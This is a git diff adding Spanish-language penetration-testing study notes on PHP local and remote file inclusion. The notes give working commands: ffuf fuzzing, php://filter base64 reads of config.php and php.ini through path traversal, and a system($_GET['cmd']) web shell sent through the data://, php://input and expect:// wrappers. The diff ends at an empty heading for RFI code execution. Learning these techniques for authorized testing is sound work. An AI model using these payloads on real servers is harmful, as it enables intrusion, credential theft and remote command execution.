@@ -238,4 +238,114 @@ El filtro del wrapper tiene unos parametros, requere en nuestro ataque que se le
 
 Hay cuatro tipos de filtros diferentes que son "String Filters", "conversion Filters", "Compression Filters", "Encryption Filters" podemos leer mas y filtrar con codificacion y con filtros de conversion.
 
+## FUZZIND EN ARCHIVOS PHP
+
+El primer paso para saber los diferentes paginas que utilizan php podemos utilizar "ffuf" o "gobuster"
+
+```
+ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
+```
+
+Despues de leer esto, el escaneo nos dara referencias de archivos PHP, Podemos empezar leyendo index.php y escanear mas referencias.
+
+### DIVULGACIÓN DE CÓDIGO
+
+Una vez que tenemos una lista potencia del archivos PHP para leer, podemos empezar a utilizar codigo con el filtro base64 PHP. Vamos a intentar leer el codigo de "config.php" usando un filtro en base64 especificamente "convert.base64-encode" para el parametro read y el config 
+
+```
+php://filter/read=convert.base64-encode/resource=config
+```
+
+![image](https://github.com/D4l1-web/PenetrationTester-Ruta/assets/79869523/2c240976-9375-4204-af74-ebe2414d4f98)
+
+
+## WRAPPERS DE PHP
+
+En este modulo, nosotros explotaremos vulnerabilidades de file inclusion varios metodos. Sobre esta sección, podemos empezara a aprender como se usa este tipo de vulnerabilidades y ejecutar código remoto y ganar el control.
+
+Nosotros podemos usar metodos para ejecutar comandos, cada uno especifico. Una forma de ganar el control del servidor es enumerando las crendenciales SSH, dandonos control de la cuenta o también sancando las contraseñas de la base de datos con un archivo como "config.php" 
+
+Otros metodos son mas triviales como encontrar otras vulnerabilidades, local file privileges, etc..
+
+### DATOS
+
+El wrapper data se usa para incluid datos xterno, como codigo PHP, sin embargo, los wrappers solo son disponibles si se usa una URL incluida, si la configuración esta activada en las configuraciones PHP. Primero vamos a activarla y leeremos la configuración
+
+## CHEKEAR CONFIGURACION PHP
+
+Vamos a incluir configuración PHP y buscar "/etc/php/X.Y/apache2.php.ini" para apche o "/etc/php/X.Y/php.ini" para Nginx, Donde "X.Y" es la versión PHP. Nosotros podemos estar con la ultima version y luego utilizar otras. 
+
+```
+curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
+```
+
+### REMOTE CODE EXECUTION
+
+Con "allow_url_include" activado, podemos prodceder con daots, como ya sabemos este wrapper se utiliza para incluid datos externos, incluid codigo PHP. Podemos pasarlo en base64 y hacer una remote shell
+
+```
+echo '<?php system($_GET["cmd"]); ?>' | base64
+```
+
+Ahora podemos hacer un URL encode como "data://text/plain;base64;" y usamos el comando &cmd=<command>
+
+```
+curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
+```
+
+# INPUT
+
+Igual que el data tambien puede incluid codigo exteno, la diferenncia esque esto lo utilizamos con POST y es vulnerable si acepta este tipo de peticiones.
+
+```
+curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
+```
+
+## EXPECT
+
+Finalmente el wrapper expect, ejecuta directamente codigo en la URL, sin embargo necesita una instalación manual y que te deje el servidor.
+
+```
+echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
+```
+El tio de configuracion se usa para activar el modulo, esto hace que consigas un RCE podemos usar expect://
+
+```
+curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
+```
+# REMOTE FILE INCLUDIO (RFI)
+
+1 - Enumerar puertos locales
+
+2 - Ganar codigo remoto y ejecutarlo
+
+## LOCAL VS INCLUSION REMOTA
+
+Cuando una vulnerabilidad incluye archivos remotos, el host normalmente no acepta script maliciosos, esto se incluye como vulnerabilidad para la pagna que se pueda ejecutar est codigo. 
+
+![image](https://github.com/D4l1-web/PenetrationTester-Ruta/assets/79869523/44b6927a-ac1a-4371-b21b-4fcc749e2ce8)
+
+Las mayorias de vulnerabilidades RFI y LFI tienen funciones de incluir remotamente URLS usualmente incluye archivos locales. Sin embargo, un LFI no tiene porque ser necesariamente un RFI.
+
+- La funcion vulnerable no incluye URL remotas
+- Tu solo tienes el control de uan forcion de algun archivo como hhtp o ftp
+- La configuracion de RFI, normalmente en servidores modernos esta quitada
+
+### VERIFICAR RFI
+
+En muchos lenguajes, incluid codigo remoto en una URL es algo peligoros, por esto esta inclusion esta quitada predeterminadamente. Por ejemplo si quieres incluir URL tiene que estar activo
+
+```
+echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
+```
+
+Sin embargo, las configuraciones estan activas, estas funciones vulnerables puedes ejecutar este codigo remoto, y determinar si es una vulnerabilidad LFI o RFI, y ver el contenido, deberemos saber siempre al empezar intentar incluid una URL local como (http:/127.0.0.1:80/index.php)
+
+Si vemos dicha página nos da por hecho que es vulnerable, esta ppagina es vulnerable a RFI
+
+### REMOTE CODE EXECUTION CON RFI
+
+
+
+
 
